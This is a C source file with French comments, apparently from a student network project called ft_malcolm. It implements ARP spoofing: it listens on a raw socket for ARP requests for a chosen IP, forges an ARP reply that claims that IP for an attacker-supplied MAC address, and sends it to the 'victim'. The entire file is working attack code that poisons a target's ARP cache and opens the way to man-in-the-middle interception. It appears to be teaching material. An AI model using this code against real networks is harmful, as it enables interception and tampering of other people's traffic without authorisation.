#include "ft_malcolm.h"

// Attend et filtre les paquets ARP jusqu'à recevoir une requête pour source_ip
int receive_arp(int sockfd, uint8_t *buffer, uint8_t *source_ip)
{
	struct arp_packet *arp = (struct arp_packet *)(buffer + ETH_HEADER_SIZE);

	while (1)
	{
		// syscall bloquant : le process dort dans le kernel jusqu'à réception d'un paquet
		if (recvfrom(sockfd, buffer, ARP_FRAME_SIZE, 0, NULL, NULL) < 0)
		{
			perror("recvfrom");
			return 0;
		}
		if (ntohs(arp->opcode) != 1)
		{
			printf("not an ARP request, ignoring\n");
			continue;
		}
		if (memcmp(arp->dst_ip, source_ip, 4) != 0)
		{
			printf("ARP request is not for our IP, ignoring\n");
			continue;
		}
		return 1;
	}
}

// construire la fausse réponse
void build_reply(uint8_t *reply, t_addrs *addrs)
{
	memset(reply, 0, ARP_FRAME_SIZE);

	// ethernet header
	struct ethernet_header *eth = (struct ethernet_header *)reply;
	memcpy(eth->dst_mac, addrs->target_mac, 6);  // on envoie à la victime
	memcpy(eth->src_mac, addrs->source_mac, 6);  // on se fait passer pour source
	eth->ethertype = htons(ETH_P_ARP);

	// arp reply
	struct arp_packet *arp = (struct arp_packet *)(reply + ETH_HEADER_SIZE);
	arp->hw_type    = htons(1);       // ethernet
	arp->proto_type = htons(0x0800);  // IPv4
	arp->hw_size    = 6;              // taille MAC
	arp->proto_size = 4;              // taille IP
	arp->opcode     = htons(2);       // 2 = reply
	memcpy(arp->src_mac, addrs->source_mac, 6);  // fausse MAC qu'on annonce
	memcpy(arp->src_ip,  addrs->source_ip,  4);  // fausse IP qu'on usurpe
	memcpy(arp->dst_mac, addrs->target_mac, 6);  // MAC de la victime
	memcpy(arp->dst_ip,  addrs->target_ip,  4);  // IP de la victime
}

int send_reply(int sockfd, uint8_t *reply, uint8_t *target_mac, int ifindex)
{
	// renvoit la reply
	struct sockaddr_ll dest;
	memset(&dest, 0, sizeof(dest));
	dest.sll_ifindex = ifindex;
	dest.sll_family  = AF_PACKET;
	dest.sll_halen   = 6;
	memcpy(dest.sll_addr, target_mac, 6);

	if (sendto(sockfd, reply, ARP_FRAME_SIZE, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
	{
		perror("sendto");
		return 0;
	}
	printf("ARP reply sent\n");
	return 1;
}

int run_spoof(t_addrs *addrs, int ifindex, uint8_t *buffer)
{
	if (!receive_arp(g_sockfd, buffer, addrs->source_ip))
		return 0;
	printf("got a valid ARP request, sending reply...\n");

	uint8_t reply[ARP_FRAME_SIZE];
	build_reply(reply, addrs);
	return send_reply(g_sockfd, reply, addrs->target_mac, ifindex);
}
